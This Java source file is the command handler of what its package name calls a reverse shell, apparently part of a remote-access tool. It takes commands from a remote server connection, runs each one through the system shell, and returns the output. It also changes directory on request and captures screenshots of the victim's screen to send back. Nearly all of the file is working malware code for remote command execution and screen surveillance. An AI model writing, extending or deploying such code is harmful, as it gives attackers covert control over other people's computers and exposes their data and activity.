package obs1d1anc1ph3r.reverseshell;

import java.io.*;

public class CommandHandler {

    private final ServerConnection serverConnection;
    private String currentDir = System.getProperty("user.dir");

    public CommandHandler(ServerConnection serverConnection) {
        this.serverConnection = serverConnection;
    }

    public void handleCommands() throws IOException {
        String command;
        while ((command = serverConnection.readCommand()) != null) {
            if (command.equalsIgnoreCase("exit")) {
                System.out.println("[-] Server disconnected.");
                break;
            }

            if (command.startsWith("cd ")) {
                changeDirectory(command.substring(3).trim());
            } else if (command.equalsIgnoreCase("screenshot")) {
                sendScreenShot();
            } else {
                serverConnection.sendResponse(executeCommand(command));
            }
        }
    }

    private void changeDirectory(String newDir) {
        File dir = new File(currentDir, newDir);
        if (dir.isDirectory()) {
            currentDir = dir.getAbsolutePath();
            serverConnection.sendResponse("Changed directory to: " + currentDir);
        } else {
            serverConnection.sendResponse("Error: Not a valid directory");
        }
    }

    private void sendScreenShot() {
        ScreenShot screenShot = new ScreenShot();
        byte[] imageBytes = screenShot.imageBytes();
        serverConnection.sendScreenShot(imageBytes);
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(OSUtils.getShell(), OSUtils.getShellFlag(), command);
            processBuilder.directory(new File(currentDir));
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append(" ");
                }
            }
        } catch (IOException e) {
            return "Error executing command: " + e.getMessage();
        }
        return output.toString().trim();
    }
}
